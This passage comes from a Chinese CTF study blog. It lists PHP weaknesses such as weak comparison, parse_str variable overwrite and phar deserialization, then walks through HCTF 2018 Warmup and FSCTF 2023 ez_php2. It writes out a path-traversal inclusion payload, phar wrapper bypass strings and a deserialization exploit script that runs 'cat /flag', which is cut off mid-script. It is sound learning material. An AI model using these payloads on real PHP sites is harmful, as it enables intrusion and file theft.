style="color:#000000;">如果var是数字或数字字符串则返回</font><font style="color:#000000;"> TRUE</font><font style="color:#000000;">，否则返回 </font><font style="color:#000000;">FALSE</font></li></ul></li><li><strong><font style="color:#000000;">strcmp()函数—比较字符串大小函数</font></strong><ul><li><font style="color:#000000;">strcmp只会处理字符串，如果给个数组的话呢，就会返回NULL</font></li></ul></li><li><strong><font style="color:#000000;">sha1()函数—sha1 加密函数</font></strong><ul><li><font style="color:#000000;">以下值在sha1 加密后以0E开头：</font></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line">0e1290633704</span><br><span class="line">10932435112</span><br></pre></td></tr></table></figure><ul><li><strong><font style="color:#000000;">extract()函数</font></strong><ul><li><font style="color:#000000;">从数组中将变量到导入到当前符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表创建对应的一个变量</font></li></ul></li><li><strong><font style="color:#000000;">in_array()函数</font></strong><ul><li><font style="color:#000000;">用途：用来判断一个值是否在某一个数组列表里面</font></li><li><font style="color:#000000;">缺陷：当第三个参数不设置为true时(即严格模式)，存在自动类型转换(弱比较) ，当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能</font></li></ul></li><li><strong><font style="color:#000000;">parse_str()变量覆盖</font></strong><ul><li><font style="color:#000000;">parse_str — 将字符串解析成多个变量：void parse_str ( string </font><font style="color:#000000;">$encoded_string</font><font style="color:#000000;"> [, array </font><font style="color:#000000;">&amp;$result</font><font style="color:#000000;"> ] )</font></li><li><font style="color:#000000;">如果设置了第二个变量 result，变量将会以数组元素的形式存入到这个数组，作为替代</font></li><li><font style="color:#000000;">解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量，当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞。</font></li></ul></li><li><strong><font style="color:#000000;">字符串逃逸</font></strong><ul><li><font style="color:#000000;">字符串逃逸：</font><font style="color:#000000;">在反序列化范围之外的字符（如花括号外的字符）都会被忽略，不影响反序列化的正常进行，一般分两种：</font><font style="color:#000000;">字符数增多和字符数减少</font></li><li><font style="color:#000000;">反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）</font></li><li><font style="color:#000000;">当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</font></li><li><font style="color:#000000;">当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</font></li></ul></li><li><strong><font style="color:#000000;">phar反序列化</font></strong><ul><li><font style="color:#000000;">phar反序列化</font><font style="color:#000000;">phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</font></li><li><font style="color:#000000;">phar文件：</font></li><li><font style="color:#000000;">在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:&#x2F;&#x2F;就是一种内置的流包装器</font></li><li><font style="color:#000000;">常见的流包装器：</font></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">漏洞利用条件：phar可以上传到服务器端(存在文件上传)</font></p><p><font style="color:#000000;">要有可用的魔术方法作为“跳板”。</font></p><p><font style="color:#000000;">文件操作函数的参数可控，且  :  、 &#x2F;  、phar 等特殊字符没有被过滤 </font></p><p><font style="color:#000000;">phar生成</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">绕过方法：当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">也可以利用其它协议:</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><h1 id="二、刷题"><a href="#二、刷题" class="headerlink" title="二、刷题"></a><font style="color:#000000;">二、刷题</font></h1><h2 id="（一）-HCTF-2018-Warmup"><a href="#（一）-HCTF-2018-Warmup" class="headerlink" title="（一）[HCTF 2018]Warmup"></a><font style="color:#000000;">（一）[HCTF 2018]Warmup</font></h2><p><font style="color:#000000;">还是这道题，之前写过了，这次复习一下</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477382261-04be3b7b-0cb4-4a29-923b-11a2e593af83.png"></p><p><font style="color:#000000;">进去还是滑稽图</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477321318-491d83d6-c708-41a8-9e37-75e3c64ba4a7.png"></p><p><font style="color:#000000;">看源代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477460871-4511fae6-48cb-4adb-9ee5-91b1f17d6f03.png"></p><p><font style="color:#000000;">找 source.php 文件，打开后又有一串 PHP 代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477321246-b6e51b6e-d7ca-4ebb-99d8-3bd53e4333cc.png"></p><p><font style="color:#000000;">先看一下这个 emmm 类的代码</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">公有静态函数 checkFile</font></li><li><font style="color:#000000;">变量 whitelist 包含 source.php 和 hint.php 文件</font></li><li><font style="color:#000000;">第一个 if</font><ul><li><font style="color:#000000;">条件： page 里为随机值或者 page 里的值的长度为 0</font></li><li><font style="color:#000000;">输出    you can’t see it</font></li><li><font style="color:#000000;">返回值为 false</font></li></ul></li><li><font style="color:#000000;">第二个 if</font><ul><li><font style="color:#000000;">条件：</font><font style="color:#000000;">page 是否在whitelist 内</font></li><li><font style="color:#000000;">返回值为真</font></li></ul></li><li><font style="color:#000000;">对 page 用mb_substr 函数</font><ul><li><font style="color:#000000;">mb_substr 函数的参数里有一个mb_strpos 函数</font></li><li><font style="color:#000000;">mb_strpos 函数中先是把?连接在 page 变量的后面之后返回?的位置，即 page 的字符串长度加 1</font></li><li><font style="color:#000000;">之后执行mb_substr 函数，从 0 开始，即返回 page 里的字符串</font></li><li><font style="color:#000000;"> 该代码的作用是从 page 中提取? 前的部分内容。如果 page 中没有 ?，它会返回整个字符串。 通过这种方式，可以有效移除 page 中的查询参数部分  </font></li></ul></li><li><font style="color:#000000;">第三个 if</font><ul><li><font style="color:#000000;">条件：page 是否在whitelist 内</font></li><li><font style="color:#000000;">返回值为真</font></li></ul></li><li><font style="color:#000000;">对 page 进行 url 加密</font></li><li><font style="color:#000000;">对 page 用mb_substr 函数（含义同上）</font></li><li><font style="color:#000000;">第四个 if</font><ul><li><font style="color:#000000;">条件：</font><font style="color:#000000;">page 是否在whitelist 内</font></li><li><font style="color:#000000;">返回值为真</font></li></ul></li><li><font style="color:#000000;">输出you can’t see it</font></li><li><font style="color:#000000;">返回值为 false</font></li></ul><p><font style="color:#000000;">之后看一下外面的 if 代码</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">条件：file 的 REQUEST 传参不为空 且 file 字符串长度不为 0 且 checkFile 函数返回值为 true</font></li><li><font style="color:#000000;">如果条件为真则把 file 请求的文件包含进来</font></li><li><font style="color:#000000;">如果条件为假则输出滑稽图</font></li></ul><p><font style="color:#000000;">所以先让 file 的值为 hint.php 把该文件包含进来，不包含 source.php 文件的原因为该文件就是 source.php</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737479563341-1998a6bf-dd0e-437d-9469-246d277d5f12.png"></p><p><font style="color:#000000;">所以之后可以用用 ? 跳过文件检测（该函数只截取到?之前的内容）</font></p><p><font style="color:#000000;">一层一层在文件找ffffllllaaaagggg 就行</font></p><p><font style="color:#000000;">构造 playload:</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">拿到 flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737480162886-61e6f2f8-3a55-4f2c-90de-872ffd5f396f.png"></p><h2 id="（二）-FSCTF-2023-ez-php2"><a href="#（二）-FSCTF-2023-ez-php2" class="headerlink" title="（二）[FSCTF 2023]ez_php2"></a><font style="color:#000000;">（二）</font><font style="color:#000000;">[FSCTF 2023]ez_php2</font></h2><p><font style="color:#000000;">打开靶场发现以下 PHP 代码：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737510177627-814a6d15-d95b-4dd3-9de6-2330be2977f9.png"></p><p><font style="color:#000000;">先每个类进行分析</font></p><p><font style="color:#000000;">Class Rd:</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Class Rd&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;All matters have concluded&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;ending);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)</span><br><span class="line">        &#123;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>]==<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">先定义了三个变量：ending、c1、poc，且它们都是公有的</font></li><li><font style="color:#000000;">之后使用</font><font style="color:#000000;">__destruct</font><font style="color:#000000;">()魔术方法：</font><font style="color:#000000;">当对象被销毁时会触发这个方法</font><ul><li><font style="color:#000000;">当对象被销毁后输出：All matters have concluded</font></li><li><font style="color:#000000;">结束代码</font></li></ul></li><li><font style="color:#000000;">使用 _call()魔术方法：当调用一个不可访问的对象时会触发这个方法</font><ul><li><font style="color:#000000;">这里它遍历参数，如果有某个键为 POC 且值为”1111“，则把 c1 的 var1 属性设置为”system“</font></li></ul></li></ul><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">Class Poc</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;payload = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$paylaod</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$paylaod</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">先定义了两个变量：playload、fun，且它们都是公有的</font></li><li><font style="color:#000000;">之后使用 set 魔术方法（当给一个不可访问的属性赋值时会触发这个方法），把输入的属性值分别赋值给 playload 和 fun</font></li><li><font style="color:#000000;">定义 getflag 函数,形参为 playload 的值</font><ul><li><font style="color:#000000;">输出：Have you genuinely accomplished what you set out to do?</font></li><li><font style="color:#000000;">用 file_get_contents($paylaod)尝试获取$playload 里的文件</font></li></ul></li></ul><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">Class Er</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;symbol = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">先定义了两个变量：symbol、Flag，且它们都是公有的</font></li><li><font style="color:#000000;">使用构造函数，把 symbol 属性变为 True</font></li><li><font style="color:#000000;">使用 set 魔术方法它会将传入的值作为函数调用，并将Flag属性作为参数传入这个函数</font></li></ul><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">Class Ha</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;start1.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start2===<span class="string">&quot;11111&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are Good!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">先定义了三个变量：start、start1、start2，且它们都是公有的</font></li><li><font style="color:#000000;">使用构造函数</font><ul><li><font style="color:#000000;">输出 start1 属性的值并换行</font></li></ul></li><li><font style="color:#000000;">使用__destruct()魔术方法（当调用对象被销毁时触发这个魔术方法）</font><ul><li><font style="color:#000000;">如果 start2 属性的值为 11111，则调用 start1 的 Love 方法</font></li><li><font style="color:#000000;">并传入 start 属性作为参数</font></li><li><font style="color:#000000;">然后输出You are Good!</font></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are Silly goose!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">检查Ha_rde_r是否为随机值，</font></li><li><font style="color:#000000;">如果为真则对Ha_rde_r 进行反序列化操作</font></li><li><font style="color:#000000;">否则输出You are Silly goose!</font></li></ul><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">分析代码后发现这道题入口是 Ha 类里面（毕竟 start 都写在里面了）</font></p><p><font style="color:#000000;">之后触发__destruct()魔术方法进入 Love 语句。</font></p><p><font style="color:#000000;">使得其触发__call 魔术方法，然后给start赋值（ [‘POC’&#x3D;&gt;‘1111’] ）</font></p><p><font style="color:#000000;">之后 c1 中的 var1触发__set 魔术方法，之后它的 value就成为了system</font></p><p><font style="color:#000000;">修改$Flag就可以修改执行的命令了</font></p><p><font style="color:#000000;">构造以下脚本：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class Rd&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$playload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span 